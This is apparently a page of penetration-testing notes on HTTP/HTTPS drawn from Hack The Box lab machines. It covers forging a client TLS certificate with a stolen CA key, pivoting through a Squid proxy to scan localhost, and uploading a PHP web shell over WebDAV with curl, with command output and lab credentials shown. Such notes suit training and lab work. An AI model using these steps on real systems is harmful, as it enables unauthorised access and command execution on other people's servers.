---
description: HyperText Transfer Protocol - Port 80/443
icon: globe-pointer
---

# HTTP/HTTPS

<details>

<summary><mark style="color:purple;"><strong>Generate a</strong></mark><strong> </strong><mark style="color:orange;"><strong><code>TLS</code></strong></mark><strong> </strong><mark style="color:purple;"><strong>Certificate</strong></mark></summary>

{% hint style="info" %}


#### <mark style="color:red;">**`With the CA private key already`**</mark>

1. <mark style="color:purple;">Verify Client Certificate Requirements:</mark>

```bash
openssl s_client -connect 10.10.10.131:443
```

2. <mark style="color:purple;">Generate the client's private key:</mark>

```bash
openssl genrsa -out client.key 4096
```

3. <mark style="color:purple;">Create a</mark> <mark style="color:orange;">**`certificate signing request (CSR)`**</mark> <mark style="color:purple;">, ensure the fields match the server's expectations:</mark>

```bash
openssl req -new -key client.key -out client.req
```

4. <mark style="color:purple;">Sign the</mark> <mark style="color:orange;">**`CSR`**</mark> <mark style="color:purple;">with the</mark> <mark style="color:orange;">**`CA’s private key`**</mark> <mark style="color:purple;">to issue a</mark> <mark style="color:orange;">**`client certificate`**</mark> <mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```bash
openssl x509 -req -in client.req -CA lacasadepapel-htb.pem -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer
```
{% endcode %}

5. <mark style="color:purple;">Convert the private key and certificate into a</mark> <mark style="color:orange;">**`PKCS#12 (.p12)`**</mark> <mark style="color:purple;">format file for easy import:</mark>

```bash
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
```
{% endhint %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>Squid</code></strong></mark> <mark style="color:purple;">Proxy</mark></summary>

{% hint style="info" %}
#### <mark style="color:red;">`Port 3128`</mark>

* <mark style="color:purple;">The config file normally lives in</mark> <mark style="color:orange;">**`/etc/squid/squid.conf`**</mark>
* <mark style="color:purple;">Relays on</mark> <mark style="color:orange;">**`/usr/lib/squid/basic_ncsa_auth`**</mark> <mark style="color:purple;">for authentication and the program stores the passwords in</mark> <mark style="color:orange;">**`/etc/squid/passwords`**</mark><mark style="color:purple;">.</mark>
* <mark style="color:purple;">Check if you can reverse it to access the local network.</mark>
* <mark style="color:purple;">First add the address and port to the last line of your</mark> <mark style="color:orange;">**`proxychains.conf`**</mark> <mark style="color:purple;">file:</mark>

```
http 10.10.10.67 312
```

* <mark style="color:purple;">Then, just</mark> <mark style="color:orange;">**`nmap`**</mark> <mark style="color:purple;">the</mark> <mark style="color:orange;">**`localhost`**</mark><mark style="color:purple;">:</mark>

```sh
proxychains nmap -n -sT 127.0.0.1
```
{% endhint %}

***

{% hint style="info" %}


#### <mark style="color:red;">`Upstream Proxy Server`</mark>

1. <mark style="color:purple;">On</mark> <mark style="color:orange;">**`burp`**</mark> <mark style="color:purple;">go to</mark> <mark style="color:orange;">**`Settings > Network > Connections`**</mark>
2. &#x20;<mark style="color:purple;">Create a new rule with</mark> <mark style="color:orange;">**`*`**</mark> <mark style="color:purple;">for the</mark> <mark style="color:orange;">**`Destination Host`**</mark><mark style="color:purple;">, set the target proxy as the</mark> <mark style="color:orange;">**`Proxy Host/Port`**</mark> <mark style="color:purple;">and set the credentials with basic</mark> <mark style="color:orange;">**`Authentication type`**</mark><mark style="color:purple;">.</mark>
3. <mark style="color:purple;">In order to fuzz the</mark> <mark style="color:orange;">**`localhost`**</mark><mark style="color:purple;">, set a</mark> <mark style="color:orange;">**`Proxy Listener`**</mark><mark style="color:purple;">, redirect to</mark> <mark style="color:orange;">**`127.0.0.1:80`**</mark> <mark style="color:purple;">and set</mark> <mark style="color:orange;">**`127.0.0.1:1234`**</mark> <mark style="color:purple;">as the interface.</mark>
4. <mark style="color:purple;">Now add the interface to</mark> <mark style="color:orange;">**`/etc/proxychains.conf`**</mark><mark style="color:purple;">.</mark>
{% endhint %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>WebDAV</code></strong></mark></summary>

{% hint style="info" %}
###

_<mark style="color:purple;">**Web Distributed Authoring and Versioning**</mark>_<mark style="color:purple;">, an extension of the</mark> <mark style="color:orange;">**`HTTP`**</mark> <mark style="color:purple;">protocol that allows users to collaboratively edit and manage files stored on a remote server.</mark>

* <mark style="color:purple;">Extends HTTP methods like</mark> <mark style="color:orange;">**`GET`**</mark> <mark style="color:purple;">and</mark> <mark style="color:orange;">**`POST`**</mark> <mark style="color:purple;">with additional ones like</mark> <mark style="color:orange;">**`PROPFIND`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`PROPPATCH`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`MKCOL`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`DELETE`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`COPY`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`MOVE`**</mark><mark style="color:purple;">, and</mark> <mark style="color:orange;">**`LOCK`**</mark><mark style="color:purple;">.</mark>
* <mark style="color:purple;">Credentials can be found at</mark> <mark style="color:orange;">**`webdav.passwd`**</mark><mark style="color:purple;">**.**</mark>
* [<mark style="color:orange;">**`devtest`**</mark>](https://github.com/cldrn/davtest) <mark style="color:purple;">can be use for enumeration.</mark>

***

{% code title="Upload files" overflow="wrap" %}
```sh
curl --upload-file ./file.php --user <UserName>:<Password> http://10.10.10.67/webdav_test_inception/
```
{% endcode %}

{% code title="Run commands from revshell" overflow="wrap" %}
```sh
curl --data-urlencode 'cmd=id' http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/file.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}

{% code title="Enumeration" overflow="wrap" %}
```sh
davtest.pl -url http://10.10.10.67/webdav_test_inception -auth <UserName>:<Password>
```
{% endcode %}
{% endhint %}

</details>
